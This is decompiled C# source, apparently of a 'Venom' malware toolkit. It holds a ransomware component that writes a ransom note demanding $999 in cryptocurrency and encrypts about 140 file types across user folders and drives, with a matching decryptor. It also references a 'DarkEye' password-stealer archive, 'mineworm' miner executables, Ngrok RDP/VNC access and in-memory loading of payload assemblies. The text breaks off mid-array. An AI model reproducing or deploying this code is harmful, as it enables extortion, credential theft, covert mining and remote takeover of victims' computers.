using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.DirectoryServices;
using System.DirectoryServices.AccountManagement;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.ServiceProcess;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using IWshRuntimeLibrary;
using Microsoft.CSharp;
using Microsoft.VisualBasic;
using Microsoft.Win32;
using Newtonsoft.Json;
using SharpSploit.Pivoting;

public class GClass52
{
	public enum GEnum19 : uint
	{
		const_0 = 2147483648u,
		const_1 = 2u,
		const_2 = 1u
	}

	[CompilerGenerated]
	private sealed class Class56
	{
		public string string_0;

		public string string_1;

		public string string_2;

		public string string_3;

		public string string_4;

		public string string_5;

		public string string_6;

		public string string_7;

		public string string_8;

		public string string_9;

		public string string_10;

		public string string_11;

		public string string_12;

		public string string_13;

		public string string_14;

		public string string_15;

		public string string_16;

		public string string_17;

		public string string_18;

		public string string_19;

		public string string_20;

		internal void method_0()
		{
			smethod_2(string_0, string_1, string_2);
		}

		internal void method_1()
		{
			smethod_2(string_3, string_1, string_2);
		}

		internal void method_2()
		{
			smethod_2(string_4, string_1, string_2);
		}

		internal void method_3()
		{
			smethod_2(string_5, string_1, string_2);
		}

		internal void method_4()
		{
			smethod_2(string_6, string_1, string_2);
		}

		internal void method_5()
		{
			smethod_2(string_7, string_1, string_2);
		}

		internal void method_6()
		{
			smethod_2(string_8, string_1, string_2);
		}

		internal void method_7()
		{
			smethod_2(string_9, string_1, string_2);
		}

		internal void method_8()
		{
			smethod_2(string_10, string_1, string_2);
		}

		internal void method_9()
		{
			smethod_2(string_11, string_1, string_2);
		}

		internal void method_10()
		{
			smethod_2(string_12, string_1, string_2);
		}

		internal void method_11()
		{
			smethod_2(string_13, string_1, string_2);
		}

		internal void method_12()
		{
			smethod_2(string_14, string_1, string_2);
		}

		internal void method_13()
		{
			smethod_2(string_15, string_1, string_2);
		}

		internal void method_14()
		{
			smethod_2(string_16, string_1, string_2);
		}

		internal void method_15()
		{
			smethod_2(string_17, string_1, string_2);
		}

		internal void method_16()
		{
			smethod_2(string_18, string_1, string_2);
		}

		internal void method_17()
		{
			smethod_2(string_19, string_1, string_2);
		}

		internal void method_18()
		{
			smethod_2(string_20, string_1, string_2);
		}
	}

	[CompilerGenerated]
	private sealed class Class57
	{
		public string string_0;

		internal Process method_0()
		{
			return Process.Start(string_0);
		}
	}

	[CompilerGenerated]
	private sealed class Class58
	{
		public byte[] byte_0;

		internal void method_0()
		{
			smethod_29(byte_0);
		}
	}

	[Serializable]
	[CompilerGenerated]
	private sealed class Class59
	{
		public static readonly Class59 class59_0 = new Class59();

		public static Action action_0;

		public static Func<bool> func_0;

		public static Action action_1;

		public static Action action_2;

		public static Func<Task<Task>> func_1;

		public static Func<Task<Task>> func_2;

		public static Action<Process> action_3;

		public static Action action_4;

		public static Action action_5;

		public static Action action_6;

		public static Action action_7;

		public static Action action_8;

		public static Func<Task<Task>> func_3;

		internal void method_0()
		{
			smethod_24();
		}

		internal bool method_1()
		{
			return Class2.smethod_7();
		}

		internal void method_2()
		{
			smethod_85();
		}

		internal void method_3()
		{
			Class2.smethod_2();
		}

		internal async Task<Task> _003CNgrokVnc_003Eb__82_0()
		{
			return DelRdpMethodAsync();
		}

		internal async Task<Task> _003CNgrokRdp_003Eb__83_0()
		{
			return DelRdpMethodAsync();
		}

		internal void method_4(Process x)
		{
			x.Kill();
		}

		internal void method_5()
		{
			smethod_26();
		}

		internal void method_6()
		{
			smethod_84();
		}

		internal void method_7()
		{
			smethod_80();
		}

		internal void method_8()
		{
			smethod_85();
		}

		internal void method_9()
		{
			smethod_15();
		}

		internal async Task<Task> _003CSendFile_003Eb__152_0()
		{
			return DelRdpMethodAsync();
		}
	}

	[CompilerGenerated]
	private sealed class Class60
	{
		public byte[] byte_0;

		public byte[] byte_1;

		public byte[] byte_2;

		internal void method_0()
		{
			smethod_29(byte_0);
		}

		internal void method_1()
		{
			smethod_29(byte_1);
		}

		internal void method_2()
		{
			smethod_29(byte_2);
		}
	}

	[CompilerGenerated]
	private sealed class Class61
	{
		public byte[] byte_0;

		internal void method_0()
		{
			try
			{
				Assembly assembly = AppDomain.CurrentDomain.Load(byte_0);
				MethodInfo entryPoint = assembly.EntryPoint;
				object obj = assembly.CreateInstance(entryPoint.Name);
				object[] parameters = new object[1];
				if (entryPoint.GetParameters().Length == 0)
				{
					parameters = null;
				}
				entryPoint.Invoke(obj, parameters);
			}
			catch
			{
			}
		}
	}

	[CompilerGenerated]
	private sealed class Class62
	{
		public byte[] byte_0;

		internal void method_0()
		{
			MethodInfo entryPoint = Assembly.Load(byte_0).EntryPoint;
			if (entryPoint != null)
			{
				entryPoint.Invoke(null, null);
			}
		}
	}

	[CompilerGenerated]
	private sealed class Class63
	{
		public byte[] byte_0;

		internal void method_0()
		{
			smethod_29(byte_0);
		}
	}

	[CompilerGenerated]
	private sealed class Class64
	{
		public byte[] byte_0;

		internal void method_0()
		{
			File.WriteAllBytes(string_14, byte_0);
		}
	}

	[CompilerGenerated]
	private sealed class Class65
	{
		public byte[] byte_0;

		public byte[] byte_1;

		internal void method_0()
		{
			smethod_29(byte_0);
		}

		internal void method_1()
		{
			smethod_29(byte_1);
		}
	}

	[CompilerGenerated]
	private sealed class Class66
	{
		public byte[] byte_0;

		public byte[] byte_1;

		public byte[] byte_2;

		internal void method_0()
		{
			smethod_29(byte_0);
		}

		internal void method_1()
		{
			smethod_29(byte_1);
		}

		internal void method_2()
		{
			smethod_29(byte_2);
		}
	}

	[CompilerGenerated]
	private static class Class67
	{
		public static CallSite<Func<CallSite, object, GInterface9>> callSite_0;
	}

	private const int int_0 = 0;

	private const int int_1 = 5;

	public static string string_0 = "HAYIR";

	public static string string_1 = Path.Combine(Path.GetTempPath(), "Venom\\DarkEye_Passwords.zip");

	public static string string_2 = Path.Combine(dkPassDirectory, "DarkEye_Passwords.txt");

	public static string string_3 = Path.Combine(dkPassDirectory, "DarkEye_Passwords.html");

	public static string string_4 = Encoding.UTF8.GetString(Convert.FromBase64String(smethod_58("gQ8qxzxGQ6tCfnxdcTHggypxrsh84/ZPaB6zQZr32ZIngFw97hGp88lGESFOmRFuKhpfKiXJ68fR8c2qmRDFmW6gVmRTHFcQssKadf3pZEr2v8L2T+wRzxQiZ65fHHpVsRjD6R+BXea7ZKc/WE7moQ==")));

	private static string string_5 = Path.GetTempPath() + "mineworm\\";

	private static string string_6 = string_5 + "mineworm.exe";

	private static string string_7 = string_5 + "libcurl-4.dll";

	private static string string_8 = string_5 + "libiconv-2.dll";

	private static string string_9 = string_5 + "libidn-11.dll";

	private static string string_10 = string_5 + "libintl-8.dll";

	private static string string_11 = string_5 + "libwinpthread-1.dll";

	private static string string_12 = string_5 + "zlib1.dll";

	private static string string_13 = string_5 + "minewormhide.exe";

	private static string string_14 = Path.GetTempPath() + "minewormworkout.exe";

	private static Random random_0 = new Random();

	public static string string_15 = "qo1lc3sjd8zpt9cx";

	public static string string_16 = "ow7dxys8glfor9tnc2ansdfo1etkfjcv";

	private static readonly IntPtr intptr_0 = new IntPtr(65535);

	private const int int_2 = 26;

	private const int int_3 = 2;

	private const string string_17 = "Venom";

	private const string string_18 = "Administrators Group";

	private const string string_19 = "Venom";

	public static string dkPassDirectory => Path.Combine(Path.GetTempPath(), "Venom\\DarkEye\\");

	public static string dkPassDirectoryzip => Path.Combine(Path.GetTempPath(), "Venom\\DarkEye\\DarkEye_Passwords.zip");

	public static string tozip => Path.Combine(dkPassDirectory, "Browsers");

	[DllImport("kernel32.dll")]
	private static extern IntPtr GetConsoleWindow();

	[DllImport("user32.dll")]
	private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

	public static void smethod_0()
	{
	}

	public static void smethod_1()
	{
		string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Decryptor.exe");
		File.WriteAllBytes(text, GClass4.Decryptor);
		string string_0 = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\";
		string string_14 = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\";
		string string_15 = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + "\\";
		string string_16 = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\";
		string string_17 = Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\";
		string string_18 = Environment.GetFolderPath(Environment.SpecialFolder.MyComputer) + "\\";
		string string_19 = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + "\\";
		string string_20 = "C:\\\\";
		string string_2 = "M:\\\\";
		string string_3 = "L:\\\\";
		string string_4 = "K:\\\\";
		string string_5 = "J:\\\\";
		string string_6 = "I:\\\\";
		string string_7 = "H:\\\\";
		string string_8 = "G:\\\\";
		string string_9 = "F:\\\\";
		string string_10 = "E:\\\\";
		string string_11 = "D:\\\\";
		string string_13 = "B:\\\\";
		string string_1 = "2AT8T3QJK0WQEPU6GFCU8HGSSKXNAK";
		string string_12 = ".Venom";
		Task.Run(delegate
		{
			smethod_2(string_0, string_1, string_12);
		}).Wait();
		Task.Run(delegate
		{
			smethod_2(string_14, string_1, string_12);
		}).Wait();
		Task.Run(delegate
		{
			smethod_2(string_15, string_1, string_12);
		}).Wait();
		Task.Run(delegate
		{
			smethod_2(string_16, string_1, string_12);
		}).Wait();
		Task.Run(delegate
		{
			smethod_2(string_17, string_1, string_12);
		}).Wait();
		Task.Run(delegate
		{
			smethod_2(string_18, string_1, string_12);
		}).Wait();
		Task.Run(delegate
		{
			smethod_2(string_19, string_1, string_12);
		}).Wait();
		Task.Run(delegate
		{
			smethod_2(string_20, string_1, string_12);
		}).Wait();
		Task.Run(delegate
		{
			smethod_2(string_2, string_1, string_12);
		}).Wait();
		Task.Run(delegate
		{
			smethod_2(string_3, string_1, string_12);
		}).Wait();
		Task.Run(delegate
		{
			smethod_2(string_4, string_1, string_12);
		}).Wait();
		Task.Run(delegate
		{
			smethod_2(string_5, string_1, string_12);
		}).Wait();
		Task.Run(delegate
		{
			smethod_2(string_6, string_1, string_12);
		}).Wait();
		Task.Run(delegate
		{
			smethod_2(string_7, string_1, string_12);
		}).Wait();
		Task.Run(delegate
		{
			smethod_2(string_8, string_1, string_12);
		}).Wait();
		Task.Run(delegate
		{
			smethod_2(string_9, string_1, string_12);
		}).Wait();
		Task.Run(delegate
		{
			smethod_2(string_10, string_1, string_12);
		}).Wait();
		Task.Run(delegate
		{
			smethod_2(string_11, string_1, string_12);
		}).Wait();
		Task.Run(delegate
		{
			smethod_2(string_13, string_1, string_12);
		}).Wait();
		Process.Start(text);
	}

	public static void smethod_2(string directory, string password, string extension)
	{
		smethod_3(directory, password, extension.Replace(".", string.Empty));
	}

	public static void smethod_3(string directory, string password, string extension)
	{
		FileInfo[] files = new DirectoryInfo(directory).GetFiles("*." + extension, SearchOption.AllDirectories);
		foreach (FileInfo fileInfo in files)
		{
			smethod_4(fileInfo.FullName, fileInfo.FullName.Replace(extension, string.Empty), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
		}
	}

	public static void smethod_4(string inputFile, string outputFile, byte[] passwordBytes)
	{
		//IL_00d3: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			FileStream fileStream = new FileStream(inputFile, FileMode.Open);
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.KeySize = 256;
			rijndaelManaged.BlockSize = 128;
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
			rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
			rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
			rijndaelManaged.Padding = PaddingMode.Zeros;
			rijndaelManaged.Mode = CipherMode.CBC;
			CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Read);
			FileStream fileStream2 = new FileStream(outputFile, FileMode.Create);
			int num;
			while ((num = cryptoStream.ReadByte()) != -1)
			{
				fileStream2.WriteByte((byte)num);
			}
			fileStream2.Close();
			cryptoStream.Close();
			fileStream.Close();
			File.Delete(inputFile);
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message, "Error", (MessageBoxButtons)0, (MessageBoxIcon)16);
		}
	}

	public static void smethod_5(string btc, string eth, string xmr)
	{
		string userName = Environment.UserName;
		Environment.MachineName.ToString();
		string text = "//Desktop//HOW-TO-RECOVER-YOUR-FILES.txt";
		StreamWriter streamWriter = new StreamWriter(new FileStream("C:\\Users\\" + userName + text, FileMode.OpenOrCreate, FileAccess.Write));
		streamWriter.BaseStream.Seek(0L, SeekOrigin.End);
		streamWriter.WriteLine("**INSTRUCTRIONS TO FOLLOW TO GET YOUR FILES BACK**" + Environment.NewLine);
		streamWriter.WriteLine("Go to blockchain.com create a bitcoin wallet if you do not possess one already..." + Environment.NewLine);
		streamWriter.WriteLine("Then proceed to your citys nearest Bitcoin ATM and deposit exactly $999 dollars" + Environment.NewLine);
		streamWriter.WriteLine("usd *Heres a perk for you** you get to pick which cyrpto currency to send me wow" + Environment.NewLine);
		streamWriter.WriteLine("im seriously in suspense qas to which one you pick:) here are your choices..." + Environment.NewLine);
		streamWriter.WriteLine("Bitcoin" + Environment.NewLine);
		streamWriter.WriteLine("Litecoin" + Environment.NewLine);
		streamWriter.WriteLine("Ethereum  " + Environment.NewLine);
		streamWriter.WriteLine("once youve chosen follow the bitcoin atms directions to succesfully pay my bills " + Environment.NewLine);
		streamWriter.WriteLine("Once you've completed this daunting task send the crypto currency youve chosin to the" + Environment.NewLine);
		streamWriter.WriteLine("following address corresponding to the crypto currency you purchased." + Environment.NewLine);
		streamWriter.WriteLine("Bitcoin           " + btc + Environment.NewLine);
		streamWriter.WriteLine("Ethereum    " + eth + Environment.NewLine);
		streamWriter.WriteLine("Litecoin         " + xmr);
		streamWriter.Flush();
		streamWriter.Close();
		Thread.Sleep(5000);
		Process.Start("notepad.exe", Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HOW-TO-RECOVER-YOUR-FILES.txt");
		Thread.Sleep(4000);
		smethod_7(new string[1] { Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\" }, new string[140]
		{
			"txt", "jpeg", "gif", "jpg", "png", "docx", "php", "cs", "cpp", "rar",
			"zip", "html", "htm", "xlsx", "avi", "mp4", "aif", "cda", "mid", "midi",
			"mp3", "mpa", "ogg", "wav", "wma", "wpl", "7z", "arj", "deb", "pkg",
			"rar", "rpm", "z", "zip", "bin", "dmg", "iso", "toast", "vcd", "csv",
			"dat", "db", "dbf", "log", "mdb", "sav", "sql", "tar", "xml", "apk",
			"bat", "bin", "cgi", "pl", "com", "exe", "gadget", "jar", "py", "wsf",
			"fnt", "fon", "otf", "ttf", "ai", "bmp", "gif", "ico", "jpeg", "jpg",
			"png", "ps", "psd", "svg", "tif", "tiff", "asp", "aspx", "cer", "cfm",
			"cgi", "pl", "css", "htm", "html", "js", "jsp", "part", "php", "py",
			"rss", "xhtml", "key", "odp", "pps", "ppt", "pptx", "c", "class", "cpp",
			"cs", "h", "java", "sh", "swift", "vb", "ods", "xlr", "xls", "xlsx",
			"bak", "cab", "cfg", "cpl", "cur", "dll", "dmp", "drv", "icns", "ico",
			"ini", "lnk", "msi", "sys", "tmp", "3g2", "3g", "avi", "flv", "h264",
			"m4v", "mkv", "mov", "mp4", "mpg", "mpeg", "rm", "swf", "vob", "wmv"
		}, "2AT8T3QJK0WQEPU6GFCU8HGSSKXNAK", ".Venom");
		smethod_7(new string[1] { Environment.GetFolderPath(Environment.SpecialFolder.MyPictures) + "\\" }, new string[140]
		{
			"txt", "jpeg", "gif", "jpg", "png", "docx", "php", "cs", "cpp", "rar",
			"zip", "html", "htm", "xlsx", "avi", "mp4", "aif", "cda", "mid", "midi",
			"mp3", "mpa", "ogg", "wav", "wma", "wpl", "7z", "arj", "deb", "pkg",
			"rar", "rpm", "z", "zip", "bin", "dmg", "iso", "toast", "vcd", "csv",
			"dat", "db", "dbf", "log", "mdb", "sav", "sql", "tar", "xml", "apk",
			"bat", "bin", "cgi", "pl", "com", "exe", "gadget", "jar", "py", "wsf",
			"fnt", "fon", "otf", "ttf", "ai", "bmp", "gif", "ico", "jpeg", "jpg",
			"png", "ps", "psd", "svg", "tif", "tiff", "asp", "aspx", "cer", "cfm",
			"cgi", "pl", "css", "htm", "html", "js", "jsp", "part", "php", "py",
			"rss", "xhtml", "key", "odp", "pps", "ppt", "pptx", "c", "class", "cpp",
			"cs", "h", "java", "sh", "swift", "vb", "ods", "xlr", "xls", "xlsx",
			"bak", "cab", "cfg", "cpl", "cur", "dll", "dmp", "drv", "icns", "ico",
			"ini", "lnk", "msi", "sys", "tmp", "3g2", "3g", "avi", "flv", "h264",
			"m4v", "mkv", "mov", "mp4", "mpg", "mpeg", "rm", "swf", "vob", "wmv"
		}, "2AT8T3QJK0WQEPU6GFCU8HGSSKXNAK", ".Venom");
		smethod_7(new string[1] { Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\" }, new string[140]
		{
			"txt", "jpeg", "gif", "jpg", "png", "docx", "php", "cs", "cpp", "rar",
			"zip", "html", "htm", "xlsx", "avi", "mp4", "aif", "cda", "mid", "midi",
			"mp3", "mpa", "ogg", "wav", "wma", "wpl", "7z", "arj", "deb", "pkg",
			"rar", "rpm", "z", "zip", "bin", "dmg", "iso", "toast", "vcd", "csv",
			"dat", "db", "dbf", "log", "mdb", "sav", "sql", "tar", "xml", "apk",
			"bat", "bin", "cgi", "pl", "com", "exe", "gadget", "jar", "py", "wsf",
			"fnt", "fon", "otf", "ttf", "ai", "bmp", "gif", "ico", "jpeg", "jpg",
			"png", "ps", "psd", "svg", "tif", "tiff", "asp", "aspx", "cer", "cfm",
			"cgi", "pl", "css", "htm", "html", "js", "jsp", "part", "php", "py",
			"rss", "xhtml", "key", "odp", "pps", "ppt", "pptx", "c", "class", "cpp",
			"cs", "h", "java", "sh", "swift", "vb", "ods", "xlr", "xls", "xlsx",
			"bak", "cab", "cfg", "cpl", "cur", "dll", "dmp", "drv", "icns", "ico",
			"ini", "lnk", "msi", "sys", "tmp", "3g2", "3g", "avi", "flv", "h264",
			"m4v", "mkv", "mov", "mp4", "mpg", "mpeg", "rm", "swf", "vob", "wmv"
		}, "2AT8T3QJK0WQEPU6GFCU8HGSSKXNAK", ".Venom");
		smethod_7(new string[1] { Environment.GetFolderPath(Environment.SpecialFolder.MyVideos) + "\\" }, new string[140]
		{
			"txt", "jpeg", "gif", "jpg", "png", "docx", "php", "cs", "cpp", "rar",
			"zip", "html", "htm", "xlsx", "avi", "mp4", "aif", "cda", "mid", "midi",
			"mp3", "mpa", "ogg", "wav", "wma", "wpl", "7z", "arj", "deb", "pkg",
			"rar", "rpm", "z", "zip", "bin", "dmg", "iso", "toast", "vcd", "csv",
			"dat", "db", "dbf", "log", "mdb", "sav", "sql", "tar", "xml", "apk",
			"bat", "bin", "cgi", "pl", "com", "exe", "gadget", "jar", "py", "wsf",
			"fnt", "fon", "otf", "ttf", "ai", "bmp", "gif", "ico", "jpeg", "jpg",
			"png", "ps", "psd", "svg", "tif", "tiff", "asp", "aspx", "cer", "cfm",
			"cgi", "pl", "css", "htm", "html", "js", "jsp", "part", "php", "py",
			"rss", "xhtml", "key", "odp", "pps", "ppt", "pptx", "c", "class", "cpp",
			"cs", "h", "java", "sh", "swift", "vb", "ods", "xlr", "xls", "xlsx",
			"bak", "cab", "cfg", "cpl", "cur", "dll", "dmp", "drv", "icns", "ico",
			"ini", "lnk", "msi", "sys", "tmp", "3g2", "3g", "avi", "flv", "h264",
			"m4v", "mkv", "mov", "mp4", "mpg", "mpeg", "rm", "swf", "vob", "wmv"
		}, "2AT8T3QJK0WQEPU6GFCU8HGSSKXNAK", ".Venom");
		smethod_7(new string[1] { Environment.GetFolderPath(Environment.SpecialFolder.MyComputer) + "\\" }, new string[140]
		{
			"txt", "jpeg", "gif", "jpg", "png", "docx", "php", "cs", "cpp", "rar",
			"zip", "html", "htm", "xlsx", "avi", "mp4", "aif", "cda", "mid", "midi",
			"mp3", "mpa", "ogg", "wav", "wma", "wpl", "7z", "arj", "deb", "pkg",
			"rar", "rpm", "z", "zip", "bin", "dmg", "iso", "toast", "vcd", "csv",
			"dat", "db", "dbf", "log", "mdb", "sav", "sql", "tar", "xml", "apk",
			"bat", "bin", "cgi", "pl", "com", "exe", "gadget", "jar", "py", "wsf",
			"fnt", "fon", "otf", "ttf", "ai", "bmp", "gif", "ico", "jpeg", "jpg",
			"png", "ps", "psd", "svg", "tif", "tiff", "asp", "aspx", "cer", "cfm",
			"cgi", "pl", "css", "htm", "html", "js", "jsp", "part", "php", "py",
			"rss", "xhtml", "key", "odp", "pps", "ppt", "pptx", "c", "class", "cpp",
			"cs", "h", "java", "sh", "swift", "vb", "ods", "xlr", "xls", "xlsx",
			"bak", "cab", "cfg", "cpl", "cur", "dll", "dmp", "drv", "icns", "ico",
			"ini", "lnk", "msi", "sys", "tmp", "3g2", "3g", "avi", "flv", "h264",
			"m4v", "mkv", "mov", "mp4", "mpg", "mpeg", "rm", "swf", "vob", "wmv"
		}, "2AT8T3QJK0WQEPU6GFCU8HGSSKXNAK", ".Venom");
		smethod_7(new string[1] { Environment.GetFolderPath(Environment.SpecialFolder.MyMusic) + "\\" }, new string[140]
		{
			"txt", "jpeg", "gif", "jpg", "png", "docx", "php", "cs", "cpp", "rar",
			"zip", "html", "htm", "xlsx", "avi", "mp4", "aif", "cda", "mid", "midi",
			"mp3", "mpa", "ogg", "wav", "wma", "wpl", "7z", "arj", "deb", "pkg",
			"rar", "rpm", "z", "zip", "bin", "dmg", "iso", "toast", "vcd", "csv",
			"dat", "db", "dbf", "log", "mdb", "sav", "sql", "tar", "xml", "apk",
			"bat", "bin", "cgi", "pl", "com", "exe", "gadget", "jar", "py", "wsf",
			"fnt", "fon", "otf", "ttf", "ai", "bmp", "gif", "ico", "jpeg", "jpg",
			"png", "ps", "psd", "svg", "tif", "tiff", "asp", "aspx", "cer", "cfm",
			"cgi", "pl", "css", "htm", "html", "js", "jsp", "part", "php", "py",
			"rss", "xhtml", "key", "odp", "pps", "ppt", "pptx", "c", "class", "cpp",
			"cs", "h", "java", "sh", "swift", "vb", "ods", "xlr", "xls", "xlsx",
			"bak", "cab", "cfg", "cpl", "cur", "dll", "dmp", "drv", "icns", "ico",
			"ini", "lnk", "msi", "sys", "tmp", "3g2", "3g", "avi", "flv", "h264",
			"m4v", "mkv", "mov", "mp4", "mpg", "mpeg", "rm", "swf", "vob", "wmv"
		}, "2AT8T3QJK0WQEPU6GFCU8HGSSKXNAK", ".Venom");
		smethod_7(new string[1] { Environment.SystemDirectory + "\\" }, new string[140]
		{
			"txt", "jpeg", "gif", "jpg", "png", "docx", "php", "cs", "cpp", "rar",
			"zip", "html", "htm", "xlsx", "avi", "mp4", "aif", "cda", "mid", "midi",
			"mp3", "mpa", "ogg", "wav", "wma", "wpl", "7z", "arj", "deb", "pkg",
			"rar", "rpm", "z", "zip", "bin", "dmg", "iso", "toast", "vcd", "csv",
			"dat", "db", "dbf", "log", "mdb", "sav", "sql", "tar", "xml", "apk",
			"bat", "bin", "cgi", "pl", "com", "exe", "gadget", "jar", "py", "wsf",
			"fnt", "fon", "otf", "ttf", "ai", "bmp", "gif", "ico", "jpeg", "jpg",
			"png", "ps", "psd", "svg", "tif", "tiff", "asp", "aspx", "cer", "cfm",
			"cgi", "pl", "css", "htm", "html", "js", "jsp", "part", "php", "py",
			"rss", "xhtml", "key", "odp", "pps", "ppt", "pptx", "c", "class", "cpp",
			"cs", "h", "java", "sh", "swift", "vb", "ods", "xlr", "xls", "xlsx",
			"bak", "cab", "cfg", "cpl", "cur", "dll", "dmp", "drv", "icns", "ico",
			"ini", "lnk", "msi", "sys", "tmp", "3g2", "3g", "avi", "flv", "h264",
			"m4v", "mkv", "mov", "mp4", "mpg", "mpeg", "rm", "swf", "vob", "wmv"
		}, "2AT8T3QJK0WQEPU6GFCU8HGSSKXNAK", ".Venom");
		smethod_7(new string[1] { "C:\\\\" }, new string[140]
		{
			"txt", "jpeg", "gif", "jpg", "png", "docx", "php", "cs", "cpp", "rar",
			"zip", "html", "htm", "xlsx", "avi", "mp4", "aif", "cda", "mid", "midi",
			"mp3", "mpa", "ogg", "wav", "wma", "wpl", "7z", "arj", "deb", "pkg",
			"rar", "rpm", "z", "zip", "bin", "dmg", "iso", "toast", "vcd", "csv",
			"dat", "db", "dbf", "log", "mdb", "sav", "sql", "tar", "xml", "apk",
			"bat", "bin", "cgi", "pl", "com", "exe", "gadget", "jar", "py", "wsf",
			"fnt", "fon", "otf", "ttf", "ai", "bmp", "gif", "ico", "jpeg", "jpg",
			"png", "ps", "psd", "svg", "tif", "tiff", "asp", "aspx", "cer", "cfm",
			"cgi", "pl", "css", "htm", "html", "js", "jsp", "part", "php", "py",
			"rss", "xhtml", "key", "odp", "pps", "ppt", "pptx", "c", "class", "cpp",
			"cs", "h", "java", "sh", "swift", "vb", "ods", "xlr", "xls", "xlsx",
			"bak", "cab", "cfg", "cpl", "cur", "dll", "dmp", "drv", "icns", "ico",
			"ini", "lnk", "msi", "sys", "tmp", "3g2", "3g", "avi", "flv", "h264",
			"m4v", "mkv", "mov", "mp4", "mpg", "mpeg", "rm", "swf", "vob", "wmv"
		}, "2AT8T3QJK0WQEPU6GFCU8HGSSKXNAK", ".Venom");
		smethod_7(new string[1] { "M:\\\\" }, new string[140]
		{
			"txt", "jpeg", "gif", "jpg", "png", "docx", "php", "cs", "cpp", "rar",
			"zip", "html", "htm", "xlsx", "avi", "mp4", "aif", "cda", "mid", "midi",
			"mp3", "mpa", "ogg", "wav", "wma", "wpl", "7z", "arj", "deb", "pkg",
			"rar", "rpm", "z", "zip", "bin", "dmg", "iso", "toast", "vcd", "csv",
			"dat", "db", "dbf", "log", "mdb", "sav", "sql", "tar", "xml", "apk",
			"bat", "bin", "cgi", "pl", "com", "exe", "gadget", "jar", "py", "wsf",
			"fnt", "fon", "otf", "ttf", "ai", "bmp", "gif", "ico", "jpeg", "jpg",
			"png", "ps", "psd", "svg", "tif", "tiff", "asp", "aspx", "cer", "cfm",
			"cgi", "pl", "css", "htm", "html", "js", "jsp", "part", "php", "py",
			"rss", "xhtml", "key", "odp", "pps", "ppt", "pptx", "c", "class", "cpp",
			"cs", "h", "java", "sh", "swift", "vb", "ods", "xlr", "xls", "xlsx",
			"bak", "cab", "cfg", "cpl", "cur", "dll", "dmp", "drv", "icns", "ico",
			"ini", "lnk", "msi", "sys", "tmp", "3g2", "3g", "avi", "flv", "h264",
			"m4v", "mkv", "mov", "mp4", "mpg", "mpeg", "rm", "swf", "vob", "wmv"
		}, "2AT8T3QJK0WQEPU6GFCU8HGSSKXNAK", ".Venom");
		smethod_7(new string[1] { "L:\\\\" }, new string[140]
		{
			"txt", "jpeg", "gif", "jpg", "png", "docx", "php", "cs", "cpp", "rar",
			"zip", "html", "htm", "xlsx", "avi", "mp4", "aif", "cda", "mid", "midi",
			"mp3", "mpa", "ogg", "wav", "wma", "wpl", "7z", "arj", "deb", "pkg",
			"rar", "rpm", "z", "zip", "bin", "dmg", "iso", "toast", "vcd", "csv",
			"dat", "db", "dbf", "log", "mdb", "sav", "sql", "tar", "xml", "apk",
			"bat", "bin", "cgi", "pl", "com", "exe", "gadget", "jar", "py", "wsf",
			"fnt", "fon", "otf", "ttf", "ai", "bmp", "gif", "ico", "jpeg", "jpg",
			"png", "ps", "psd", "svg", "tif", "tiff", "asp", "aspx", "cer", "cfm",
			"cgi", "pl", "css", "htm", "html", "js", "jsp", "part", "php", "py",
			"rss", "xhtml", "key", "odp", "pps", "ppt", "pptx", "c", "class", "cpp",
			"cs", "h", "java", "sh", "swift", "vb", "ods", "xlr", "xls", "xlsx",
			"bak", "cab", "cfg", "cpl", "cur", "dll", "dmp", "drv", "icns", "ico",
			"ini", "lnk", "msi", "sys", "tmp", "3g2", "3g", "avi", "flv", "h264",
			"m4v", "mkv", "mov", "mp4", "mpg", "mpeg", "rm", "swf", "vob", "wmv"
		}, "2AT8T3QJK0WQEPU6GFCU8HGSSKXNAK", ".Venom");
		smethod_7(new string[1] { "K:\\\\" }, new string[140]
		{
			"txt", "jpeg", "gif", "jpg", "png", "docx", "php", "cs", "cpp", "rar",
			"zip", "html", "htm", "xlsx", "avi", "mp4", "aif", "cda", "mid", "midi",
			"mp3", "mpa", "ogg", "wav", "wma", "wpl", "7z", "arj", "deb", "pkg",
			"rar", "rpm", "z", "zip", "bin", "dmg", "iso", "toast", "vcd", "csv",
			"dat", "db", "dbf", "log", "mdb", "sav", "sql", "tar", "xml", "apk",
			"bat", "bin", "cgi", "pl", "com", "exe", "gadget", "jar", "py", "wsf",
			"fnt", "fon", "otf", "ttf", "ai", "bmp", "gif", "ico", "jpeg", "jpg",
			"png", "ps", "psd", "svg", "tif", "tiff", "asp", "aspx", "cer", "cfm",
			"cgi", "pl", "css", "htm", "html", "js", "jsp", "part", "php", "py",
			"rss", "xhtml", "key", "odp", "pps", "ppt", "pptx", "c", "class", "cpp",
			"cs", "h", "java", "sh", "swift", "vb", "ods", "xlr", "xls", "xlsx",
